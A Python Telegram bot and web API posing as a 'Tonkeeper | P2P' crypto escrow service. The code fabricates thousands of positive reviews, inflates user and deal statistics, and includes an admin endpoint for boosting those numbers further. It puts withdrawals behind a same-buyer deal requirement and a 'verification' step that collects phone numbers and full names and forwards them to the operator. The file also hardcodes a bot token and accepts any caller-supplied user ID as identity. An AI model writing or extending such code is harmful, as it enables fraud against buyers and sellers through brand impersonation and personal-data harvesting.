import asyncio
import json
import os
import uuid
import random
from datetime import datetime, timedelta
from typing import Dict, Any, List, Optional

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiohttp import web

# ============================================================
# 1. КОНФИГУРАЦИЯ
# ============================================================
BOT_TOKEN = "8973397612:AAGcMMe1r2DyZTziExnSVyjagdXm7fptrF8"
MASTER_ADMIN_ID = 8855434638
SUPPORT_LINK = "@p2psupbot"
BOT_USERNAME = "tonkeeperp2p_bot"
BOT_NAME = " Tonkeeper | P2P"
CHANNEL_LINK = "https://t.me/tonkeeper_news"
MINI_APP_URL = "https://saitminiapp.onrender.com"  # Ваш сайт на Render

# ============================================================
# 2. ИНИЦИАЛИЗАЦИЯ
# ============================================================
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

# ============================================================
# 3. ФАЙЛЫ ДЛЯ ХРАНЕНИЯ
# ============================================================
FILES = {
    "deals": "deals.json",
    "admins": "admins.json",
    "balance": "balance.json",
    "reviews": "reviews.json",
    "verification": "verification.json",
    "withdraw": "withdraw_requests.json",
    "logs": "logs.json",
    "user_language": "user_language.json",
    "stats": "stats.json"
}

def load_json(file):
    if os.path.exists(file):
        with open(file, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_json(file, data):
    with open(file, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

deals = load_json(FILES["deals"])
admins = load_json(FILES["admins"])
balance = load_json(FILES["balance"])
reviews = load_json(FILES["reviews"])
verification_data = load_json(FILES["verification"])
withdraw_requests = load_json(FILES["withdraw"])
logs = load_json(FILES["logs"])
user_language = load_json(FILES["user_language"])
stats = load_json(FILES["stats"])

# ============================================================
# 4. СТАТИСТИКА (МИНИМУМЫ)
# ============================================================
MIN_DEALS = 1264
MIN_USERS = 21374
MIN_REVIEWS = 5427
MIN_VOLUME = 47.6

def init_stats():
    if not stats:
        stats["deals_today"] = MIN_DEALS
        stats["users"] = MIN_USERS
        stats["reviews"] = MIN_REVIEWS
        stats["volume"] = MIN_VOLUME
        stats["online"] = 6500
        stats["last_update"] = datetime.now().isoformat()
        save_json(FILES["stats"], stats)
    return stats

init_stats()

def update_stats():
    now = datetime.now()
    last = datetime.fromisoformat(stats.get("last_update", now.isoformat()))
    minutes_passed = (now - last).total_seconds() / 60
    
    if minutes_passed >= 1:
        stats["deals_today"] = max(MIN_DEALS, stats.get("deals_today", MIN_DEALS) + random.choice([0, 0, 1, 0, 0, 1, 0, 0, 0, 1]))
        stats["users"] = max(MIN_USERS, stats.get("users", MIN_USERS) + random.choice([0, 0, 0, 1, 0, 0, 0, 1, 0, 0]))
        stats["reviews"] = max(MIN_REVIEWS, stats.get("reviews", MIN_REVIEWS) + random.choice([0, 0, 0, 0, 1, 0, 0, 0, 0, 1]))
        stats["volume"] = max(MIN_VOLUME, round(stats.get("volume", MIN_VOLUME) + random.choice([0, 0, 0.1, 0, 0, 0.2, 0, 0, 0, 0.1]), 1))
        stats["online"] = random.randint(6200, 6800)
        stats["last_update"] = now.isoformat()
        save_json(FILES["stats"], stats)
    return stats

def get_stats():
    return update_stats()

# ============================================================
# 5. ГЕНЕРАЦИЯ ОТЗЫВОВ
# ============================================================
def generate_reviews():
    if len(reviews) >= MIN_REVIEWS:
        return
    review_texts = [
        "Отличная платформа! Всё работает быстро и надёжно.",
        "Лучший P2P обменник! Рекомендую всем друзьям.",
        "Быстро, удобно, безопасно. Буду пользоваться дальше.",
        "Отличная поддержка! Помогли разобраться с выводом.",
        "Наконец-то нашёл нормальный обменник. Всё честно.",
        "Сделал первую сделку, всё прошло гладко. Спасибо!",
        "За сутки сделал 5 сделок, все успешно завершены.",
        "Очень доволен сервисом. Вывод моментальный.",
        "Пользуюсь уже месяц, ни одной проблемы.",
        "Лучший сервис в Telegram! Успехов разработчикам."
    ]
    for i in range(MIN_REVIEWS):
        review_id = str(uuid.uuid4())[:8]
        reviews[review_id] = {
            "id": review_id,
            "user": "Аноним",
            "rating": random.randint(4, 5),
            "text": random.choice(review_texts),
            "anonymous": True,
            "date": datetime.now().strftime("%d.%m.%Y %H:%M"),
            "user_id": None
        }
    save_json(FILES["reviews"], reviews)
    print(f"✅ Сгенерировано {len(reviews)} отзывов")

generate_reviews()

# ============================================================
# 6. ПОМОЩНИКИ
# ============================================================
def is_admin(user_id: int) -> bool:
    return user_id == MASTER_ADMIN_ID or str(user_id) in admins

def get_balance(user_id: int) -> Dict:
    uid = str(user_id)
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
        save_json(FILES["balance"], balance)
    return balance[uid]

def add_balance(user_id: int, currency: str, amount: float):
    uid = str(user_id)
    curr = currency.lower()
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
    balance[uid][curr] = balance[uid].get(curr, 0) + amount
    save_json(FILES["balance"], balance)

def is_verified(user_id: int) -> bool:
    uid = str(user_id)
    if uid not in verification_data:
        return False
    if "verified_at" in verification_data[uid]:
        verified_time = datetime.fromisoformat(verification_data[uid]["verified_at"])
        return (datetime.now() - verified_time).total_seconds() < 86400
    return False

def complete_verification(user_id: int, phone: str, full_name: str = "", username: str = ""):
    uid = str(user_id)
    verification_data[uid] = {
        "verified_at": datetime.now().isoformat(),
        "phone": phone,
        "full_name": full_name,
        "username": username
    }
    save_json(FILES["verification"], verification_data)
    add_log("verification", {
        "user_id": user_id,
        "username": username,
        "phone": phone,
        "full_name": full_name
    })

def has_2_deals_with_same_buyer(user_id: int) -> bool:
    bal = get_balance(user_id)
    partners = bal.get("deal_partners", {})
    return any(count >= 2 for count in partners.values())

def add_log(action: str, data: dict):
    log_id = str(uuid.uuid4())[:8]
    log_entry = {
        "id": log_id,
        "action": action,
        "data": data,
        "time": datetime.now().isoformat()
    }
    logs[log_id] = log_entry
    save_json(FILES["logs"], logs)
    asyncio.create_task(send_log_to_admin(log_entry))

async def send_log_to_admin(log_entry: dict):
    try:
        text = f"📋 <b>ЛОГ #{log_entry['id']}</b>\n\n"
        text += f"🕐 Время: {log_entry['time'][:19]}\n"
        text += f"📌 Действие: {log_entry['action']}\n"
        text += f"📊 Данные:\n"
        for key, value in log_entry['data'].items():
            text += f"   • {key}: {value}\n"
        await bot.send_message(MASTER_ADMIN_ID, text[:4000])
    except:
        pass

def get_user_language(user_id: int) -> str:
    uid = str(user_id)
    return user_language.get(uid, "ru")

def set_user_language(user_id: int, lang: str):
    user_language[str(user_id)] = lang
    save_json(FILES["user_language"], user_language)

# ============================================================
# 7. КЛАВИАТУРЫ (МИНИМАЛЬНЫЕ ДЛЯ БОТА)
# ============================================================
def main_menu_keyboard(user_id: int):
    buttons = [
        [InlineKeyboardButton(text="📖 Как создать сделку", callback_data="how_to_deal")],
        [InlineKeyboardButton(text="📢 Канал", callback_data="menu_channel")],
        [InlineKeyboardButton(text="🆘 Поддержка", callback_data="menu_support")],
        [InlineKeyboardButton(text="🌐 Сменить язык", callback_data="select_language")],
        [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def language_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="set_lang_ru")],
        [InlineKeyboardButton(text="🇬🇧 English", callback_data="set_lang_en")],
        [InlineKeyboardButton(text="🇨🇳 中文", callback_data="set_lang_zh")],
        [InlineKeyboardButton(text="🇸🇦 العربية", callback_data="set_lang_ar")]
    ])

# ============================================================
# 8. ОБРАБОТЧИКИ БОТА
# ============================================================
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.text and message.text.startswith("/start deal_"):
        deal_id = message.text.split("_")[1]
        await handle_deal_link(message, deal_id)
        return
    
    uid = str(message.from_user.id)
    if uid not in user_language:
        await message.answer(
            "🌐 Выберите язык / Choose language",
            reply_markup=language_keyboard()
        )
        return
    
    await message.answer(
        f"🔥 <b>{BOT_NAME}</b> 🔥\n\n"
        "Безопасные P2P сделки с криптовалютой.\n\n"
        "📌 Все сделки проводятся в <b>Mini App</b>\n"
        "📌 Бот только для уведомлений и поддержки\n\n"
        f"📢 Канал: {CHANNEL_LINK}\n"
        f"🆘 Поддержка: {SUPPORT_LINK}\n\n"
        "👇 Выберите действие:",
        reply_markup=main_menu_keyboard(message.from_user.id)
    )

@dp.callback_query(lambda c: c.data.startswith("set_lang_"))
async def set_language(callback: types.CallbackQuery):
    lang = callback.data.split("_")[2]
    set_user_language(callback.from_user.id, lang)
    await callback.answer("✅ Язык установлен")
    await callback.message.edit_text(
        f"🔥 <b>{BOT_NAME}</b> 🔥\n\n"
        "Безопасные P2P сделки с криптовалютой.\n\n"
        "👇 Выберите действие:",
        reply_markup=main_menu_keyboard(callback.from_user.id)
    )

@dp.callback_query(lambda c: c.data == "select_language")
async def select_language(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "🌐 Выберите язык / Choose language",
        reply_markup=language_keyboard()
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "menu_channel")
async def menu_channel(callback: types.CallbackQuery):
    await callback.message.edit_text(
        f"📢 <b>Наш канал</b>\n\n"
        f"{CHANNEL_LINK}\n\n"
        "В канале:\n"
        "• Новости и обновления\n"
        "• Полезные гайды\n"
        "• Розыгрыши и бонусы\n"
        "• Актуальные курсы валют",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
        ])
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "menu_support")
async def menu_support(callback: types.CallbackQuery):
    await callback.message.edit_text(
        f"🆘 <b>Поддержка</b>\n\n"
        f"{SUPPORT_LINK}\n\n"
        "📢 Наш канал: " + CHANNEL_LINK,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
        ])
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "how_to_deal")
async def how_to_deal(callback: types.CallbackQuery):
    await callback.message.edit_text(
        f"📖 <b>Как создать сделку</b>\n\n"
        "1️⃣ Нажмите <b>«Создать сделку»</b>\n"
        "   в Mini App\n\n"
        "2️⃣ Заполните форму:\n"
        "   • Название товара\n"
        "   • Валюту (TON/STARS/RUB/UAH)\n"
        "   • Сумму\n"
        "   • Username покупателя\n\n"
        "3️⃣ Отправьте ссылку покупателю\n\n"
        "4️⃣ Покупатель переходит по ссылке\n"
        "   и оплачивает на сайте\n\n"
        "5️⃣ После оплаты продавец нажимает\n"
        "   <b>«Передал товар»</b>\n\n"
        "6️⃣ Покупатель нажимает\n"
        "   <b>«Подтвердить получение»</b>\n\n"
        "7️⃣ Сделка завершена ✅\n"
        "   Деньги зачислены на баланс\n\n"
        "🔥 <b>ВАЖНО:</b>\n"
        "• Продавец НЕ МОЖЕТ подтвердить получение\n"
        "• Только покупатель завершает сделку\n"
        "• Все деньги на балансе продавца",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
        ])
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "back_to_main")
async def back_to_main(callback: types.CallbackQuery):
    await callback.message.edit_text(
        f"🔥 <b>{BOT_NAME}</b> 🔥\n\n"
        "Безопасные P2P сделки с криптовалютой.\n\n"
        "👇 Выберите действие:",
        reply_markup=main_menu_keyboard(callback.from_user.id)
    )
    await callback.answer()

# ============================================================
# 9. ОБРАБОТКА ССЫЛКИ НА СДЕЛКУ
# ============================================================
async def handle_deal_link(message: types.Message, deal_id: str):
    if deal_id not in deals:
        await message.answer("❌ Сделка не найдена")
        return

    deal = deals[deal_id]
    if deal["status"] != "waiting_payment" and deal["status"] != "paid":
        await message.answer("❌ Сделка уже завершена")
        return

    if message.from_user.username and message.from_user.username.lower() != deal["buyer_username"].lower():
        await message.answer(
            f"❌ Доступ запрещён!\n\nЭта сделка для @{deal['buyer_username']}"
        )
        return

    deal["buyer_id"] = message.from_user.id
    save_json(FILES["deals"], deals)

    add_log("deal_link_opened", {
        "deal_id": deal_id,
        "buyer": message.from_user.username,
        "seller": deal["seller_username"]
    })

    await message.answer(
        f"✈️ <b>Сделка #{deal_id}</b>\n\n"
        f"📦 Товар: {deal['product']}\n"
        f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
        f"👤 Продавец: @{deal['seller_username']}\n\n"
        f"🔥 Перейдите в Mini App для оплаты:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=f"{MINI_APP_URL}?deal={deal_id}"))],
            [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
        ])
    )

# ============================================================
# 10. API ДЛЯ MINI APP (ВСЕ ЭНДПОИНТЫ)
# ============================================================
async def handle_api(request):
    headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, X-Telegram-User-Id, X-Telegram-Username'
    }
    if request.method == 'OPTIONS':
        return web.Response(headers=headers)
    
    try:
        data = await request.json()
    except:
        data = {}
    
    user_id = data.get('user_id')
    endpoint = request.path
    
    # ===== PING (ДЛЯ UPTIMEROBOT) =====
    if endpoint == '/ping':
        return web.json_response({
            'status': 'ok',
            'time': datetime.now().isoformat(),
            'uptime': 'running'
        }, headers=headers)
    
    # ===== БАЛАНС =====
    if endpoint == '/api/balance':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        bal = get_balance(user_id)
        return web.json_response({'success': True, 'balance': bal}, headers=headers)
    
    # ===== СТАТИСТИКА =====
    elif endpoint == '/api/stats':
        stats_data = get_stats()
        return web.json_response({
            'success': True,
            'deals_today': max(MIN_DEALS, stats_data.get('deals_today', MIN_DEALS)),
            'users': max(MIN_USERS, stats_data.get('users', MIN_USERS)),
            'reviews': max(MIN_REVIEWS, stats_data.get('reviews', MIN_REVIEWS)),
            'volume': max(MIN_VOLUME, stats_data.get('volume', MIN_VOLUME))
        }, headers=headers)
    
    # ===== ОНЛАЙН =====
    elif endpoint == '/api/online':
        return web.json_response({'online': random.randint(6200, 6800)}, headers=headers)
    
    # ===== ОТЗЫВЫ =====
    elif endpoint == '/api/reviews':
        limit = data.get('limit', 10)
        page = data.get('page', 0)
        reviews_list = list(reviews.values())
        start = page * limit
        end = start + limit
        paginated = reviews_list[start:end]
        return web.json_response({
            'success': True,
            'reviews': paginated,
            'total': len(reviews_list)
        }, headers=headers)
    
    # ===== ДОБАВИТЬ ОТЗЫВ =====
    elif endpoint == '/api/add_review':
        rating = data.get('rating')
        text = data.get('text')
        anonymous = data.get('anonymous', True)
        
        if not all([user_id, rating, text]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        # Проверка: есть ли завершённые сделки у пользователя
        user_deals = [d for d in deals.values() if d.get('seller_id') == user_id and d.get('status') == 'completed']
        if len(user_deals) < 1:
            return web.json_response({'success': False, 'error': 'Need at least 1 completed deal'}, headers=headers)
        
        review_id = str(uuid.uuid4())[:8]
        reviews[review_id] = {
            "id": review_id,
            "user": "Аноним" if anonymous else str(user_id),
            "rating": rating,
            "text": text,
            "anonymous": anonymous,
            "date": datetime.now().strftime("%d.%m.%Y %H:%M"),
            "user_id": user_id
        }
        save_json(FILES["reviews"], reviews)
        add_log("add_review", {"user_id": user_id, "rating": rating})
        
        return web.json_response({'success': True, 'review_id': review_id}, headers=headers)
    
    # ===== УДАЛИТЬ ОТЗЫВ =====
    elif endpoint == '/api/delete_review':
        review_id = data.get('review_id')
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        if review_id in reviews:
            del reviews[review_id]
            save_json(FILES["reviews"], reviews)
            add_log("delete_review", {"admin": user_id, "review_id": review_id})
            return web.json_response({'success': True}, headers=headers)
        return web.json_response({'success': False, 'error': 'Review not found'}, headers=headers)
    
    # ===== ОЧИСТИТЬ ОТЗЫВЫ =====
    elif endpoint == '/api/clear_reviews':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        reviews.clear()
        save_json(FILES["reviews"], reviews)
        add_log("clear_reviews", {"admin": user_id})
        return web.json_response({'success': True}, headers=headers)
    
    # ===== ПРОВЕРКА 2 СДЕЛОК =====
    elif endpoint == '/api/has_2_deals':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        has = has_2_deals_with_same_buyer(user_id)
        return web.json_response({'success': True, 'has_2_deals': has}, headers=headers)
    
    # ===== ПРОВЕРКА ВЕРИФИКАЦИИ =====
    elif endpoint == '/api/check_verification':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        return web.json_response({'success': True, 'verified': is_verified(user_id)}, headers=headers)
    
    # ===== ВЕРИФИКАЦИЯ (ТОЛЬКО НА САЙТЕ) =====
    elif endpoint == '/api/verify':
        phone = data.get('phone')
        full_name = data.get('full_name', '')
        username = data.get('username', '')
        
        if not user_id or not phone:
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        if not has_2_deals_with_same_buyer(user_id):
            return web.json_response({'success': False, 'error': 'Need 2 deals with same buyer'}, headers=headers)
        
        complete_verification(user_id, phone, full_name, username)
        return web.json_response({'success': True, 'verified': True}, headers=headers)
    
    # ===== СОЗДАНИЕ СДЕЛКИ =====
    elif endpoint == '/api/create_deal':
        product = data.get('product')
        currency = data.get('currency')
        amount = data.get('amount')
        buyer_username = data.get('buyer_username')
        username = data.get('username', str(user_id))
        
        if not all([user_id, product, currency, amount, buyer_username]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        deal_id = str(uuid.uuid4())[:8]
        deals[deal_id] = {
            "deal_id": deal_id,
            "seller_id": user_id,
            "seller_username": username,
            "buyer_username": buyer_username.lower(),
            "buyer_id": None,
            "product": product,
            "currency": currency,
            "amount": float(amount),
            "status": "waiting_payment",
            "created_at": datetime.now().isoformat(),
            "paid_by_admin": None,
            "completed_at": None
        }
        save_json(FILES["deals"], deals)
        link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
        add_log("api_create_deal", {"deal_id": deal_id, "user_id": user_id, "amount": amount})
        return web.json_response({
            'success': True,
            'deal_id': deal_id,
            'link': link
        }, headers=headers)
    
    # ===== СДЕЛКИ ПОЛЬЗОВАТЕЛЯ =====
    elif endpoint == '/api/deals':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        user_deals = []
        for d_id, d in deals.items():
            if d.get('seller_id') == user_id or d.get('buyer_id') == user_id:
                d_copy = d.copy()
                d_copy['deal_id'] = d_id
                user_deals.append(d_copy)
        return web.json_response({'success': True, 'deals': user_deals}, headers=headers)
    
    # ===== ПРОВЕРКА АДМИНА =====
    elif endpoint == '/api/is_admin':
        return web.json_response({'success': True, 'is_admin': is_admin(user_id)}, headers=headers)
    
    # ===== ОПЛАТА С БАЛАНСА =====
    elif endpoint == '/api/pay_balance':
        deal_id = data.get('deal_id')
        if deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        deal = deals[deal_id]
        if deal["status"] != "waiting_payment":
            return web.json_response({'success': False, 'error': 'Already processed'}, headers=headers)
        
        buyer_balance = get_balance(user_id)
        curr_key = deal["currency"].lower()
        if buyer_balance.get(curr_key, 0) < deal["amount"]:
            return web.json_response({'success': False, 'error': 'Insufficient balance'}, headers=headers)
        
        buyer_balance[curr_key] -= deal["amount"]
        save_json(FILES["balance"], balance)
        
        deal["status"] = "paid"
        deal["paid_by_admin"] = user_id
        save_json(FILES["deals"], deals)
        add_log("pay_balance", {"deal_id": deal_id, "user_id": user_id, "amount": deal["amount"], "currency": deal["currency"]})
        
        return web.json_response({'success': True}, headers=headers)
    
    # ===== ОПЛАТА ПО РЕКВИЗИТАМ =====
    elif endpoint == '/api/get_rekvisits':
        deal_id = data.get('deal_id')
        if deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        deal = deals[deal_id]
        return web.json_response({
            'success': True,
            'details': f"Оплатите {deal['amount']} {deal['currency']} и нажмите «Я оплатил»"
        }, headers=headers)
    
    elif endpoint == '/api/confirm_rekvisits_payment':
        deal_id = data.get('deal_id')
        if deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        deal = deals[deal_id]
        if deal["status"] != "waiting_payment":
            return web.json_response({'success': False, 'error': 'Already processed'}, headers=headers)
        
        deal["status"] = "paid"
        deal["paid_by_admin"] = user_id
        save_json(FILES["deals"], deals)
        add_log("rekvisits_paid", {"deal_id": deal_id, "admin": user_id})
        
        return web.json_response({'success': True}, headers=headers)
    
    # ===== ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР =====
    elif endpoint == '/api/seller_delivered':
        deal_id = data.get('deal_id')
        if deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        deal = deals[deal_id]
        if deal["status"] != "paid":
            return web.json_response({'success': False, 'error': 'Not paid'}, headers=headers)
        
        deal["status"] = "awaiting_confirmation"
        save_json(FILES["deals"], deals)
        add_log("seller_delivered", {"deal_id": deal_id})
        
        return web.json_response({'success': True}, headers=headers)
    
    # ===== ПОКУПАТЕЛЬ ПОДТВЕРДИЛ =====
    elif endpoint == '/api/buyer_confirm':
        deal_id = data.get('deal_id')
        if deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        deal = deals[deal_id]
        if deal["status"] != "awaiting_confirmation":
            return web.json_response({'success': False, 'error': 'Wrong status'}, headers=headers)
        
        add_balance(deal["seller_id"], deal["currency"], deal["amount"])
        seller_balance = get_balance(deal["seller_id"])
        buyer = deal["buyer_username"]
        if buyer not in seller_balance["deal_partners"]:
            seller_balance["deal_partners"][buyer] = 0
        seller_balance["deal_partners"][buyer] += 1
        save_json(FILES["balance"], balance)
        
        deal["status"] = "completed"
        deal["completed_at"] = datetime.now().isoformat()
        save_json(FILES["deals"], deals)
        add_log("deal_completed", {"deal_id": deal_id})
        
        return web.json_response({'success': True}, headers=headers)
    
    # ===== ВЫВОД =====
    elif endpoint == '/api/withdraw':
        currency = data.get('currency')
        details = data.get('details')
        
        if not all([user_id, currency, details]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        # Проверка 2 сделок
        if not has_2_deals_with_same_buyer(user_id):
            return web.json_response({'success': False, 'error': 'Need 2 deals with same buyer'}, headers=headers)
        
        # Проверка верификации
        if not is_verified(user_id):
            return web.json_response({'success': False, 'error': 'Verification required'}, headers=headers)
        
        bal = get_balance(user_id)
        curr_key = currency.lower()
        if bal.get(curr_key, 0) <= 0:
            return web.json_response({'success': False, 'error': 'Insufficient balance'}, headers=headers)
        
        request_id = str(uuid.uuid4())[:8]
        withdraw_requests[request_id] = {
            "id": request_id,
            "user_id": user_id,
            "username": str(user_id),
            "currency": currency,
            "amount": bal[curr_key],
            "details": details,
            "status": "pending",
            "created_at": datetime.now().isoformat()
        }
        save_json(FILES["withdraw"], withdraw_requests)
        add_log("withdraw", {"user_id": user_id, "amount": bal[curr_key], "currency": currency})
        
        return web.json_response({'success': True, 'request_id': request_id}, headers=headers)
    
    # ===== ПОДТВЕРДИТЬ ВЫВОД (АДМИН) =====
    elif endpoint == '/api/confirm_withdraw':
        request_id = data.get('request_id')
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        if request_id not in withdraw_requests:
            return web.json_response({'success': False, 'error': 'Request not found'}, headers=headers)
        
        req = withdraw_requests[request_id]
        if req.get('status') != 'pending':
            return web.json_response({'success': False, 'error': 'Already processed'}, headers=headers)
        
        bal = get_balance(req['user_id'])
        curr_key = req['currency'].lower()
        if bal.get(curr_key, 0) >= req['amount']:
            bal[curr_key] -= req['amount']
            save_json(FILES["balance"], balance)
        
        req['status'] = 'completed'
        req['completed_at'] = datetime.now().isoformat()
        save_json(FILES["withdraw"], withdraw_requests)
        add_log("confirm_withdraw", {"admin": user_id, "request_id": request_id})
        
        return web.json_response({'success': True}, headers=headers)
    
    # ===== ОТКЛОНИТЬ ВЫВОД (АДМИН) =====
    elif endpoint == '/api/reject_withdraw':
        request_id = data.get('request_id')
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        if request_id not in withdraw_requests:
            return web.json_response({'success': False, 'error': 'Request not found'}, headers=headers)
        
        withdraw_requests[request_id]['status'] = 'rejected'
        save_json(FILES["withdraw"], withdraw_requests)
        add_log("reject_withdraw", {"admin": user_id, "request_id": request_id})
        
        return web.json_response({'success': True}, headers=headers)
    
    # ===== НАЧИСЛИТЬ БАЛАНС (АДМИН) =====
    elif endpoint == '/api/add_balance':
        target_user_id = data.get('target_user_id')
        currency = data.get('currency')
        amount = data.get('amount')
        
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        if not all([target_user_id, currency, amount]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        add_balance(target_user_id, currency, float(amount))
        add_log("api_add_balance", {"admin": user_id, "target": target_user_id, "amount": amount, "currency": currency})
        
        return web.json_response({'success': True}, headers=headers)
    
    # ===== ВСЕ СДЕЛКИ (АДМИН) =====
    elif endpoint == '/api/all_deals':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        deals_list = []
        for d_id, d in deals.items():
            d_copy = d.copy()
            d_copy['deal_id'] = d_id
            deals_list.append(d_copy)
        return web.json_response({'success': True, 'deals': deals_list}, headers=headers)
    
    # ===== ЗАЯВКИ НА ВЫВОД (АДМИН) =====
    elif endpoint == '/api/withdraw_requests':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        pending = [r for r in withdraw_requests.values() if r.get('status') == 'pending']
        return web.json_response({'success': True, 'requests': pending}, headers=headers)
    
    # ===== НАКРУТКА СТАТИСТИКИ (АДМИН) =====
    elif endpoint == '/api/admin_set_stats':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        key = data.get('key')
        value = data.get('value')
        if not key or value is None:
            return web.json_response({'success': False, 'error': 'Missing key or value'}, headers=headers)
        
        # При накрутке не даём упасть ниже минимума
        if key == 'deals_today':
            value = max(MIN_DEALS, value)
        elif key == 'users':
            value = max(MIN_USERS, value)
        elif key == 'reviews':
            value = max(MIN_REVIEWS, value)
        elif key == 'volume':
            value = max(MIN_VOLUME, round(value, 1))
        
        stats[key] = value
        save_json(FILES["stats"], stats)
        add_log("admin_set_stats", {"key": key, "value": value})
        return web.json_response({'success': True}, headers=headers)
    
    return web.json_response({'success': False, 'error': 'Unknown endpoint'}, headers=headers)

# ============================================================
# 11. ЗАПУСК ВЕБ-СЕРВЕРА
# ============================================================
async def start_web_server():
    app = web.Application()
    app.router.add_route('*', '/{path:.*}', handle_api)
    port = int(os.environ.get('PORT', 3000))
    print(f"🌐 API сервер запущен на порту {port}")
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    return runner

# ============================================================
# 12. ЗАПУСК
# ============================================================
async def main():
    print("=" * 50)
    print("🔥 Tonkeeper P2P Бот + API")
    print("=" * 50)
    print(f"👑 Мастер-админ: {MASTER_ADMIN_ID}")
    print(f"🤖 Бот: @{BOT_USERNAME}")
    print(f"📱 Mini App: {MINI_APP_URL}")
    print(f"📊 Мин. сделок: {MIN_DEALS}")
    print(f"📊 Мин. пользователей: {MIN_USERS}")
    print(f"📊 Мин. отзывов: {MIN_REVIEWS}")
    print(f"📊 Мин. объём: {MIN_VOLUME}")
    print("=" * 50)
    await start_web_server()
    print("✅ Бот готов к работе!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
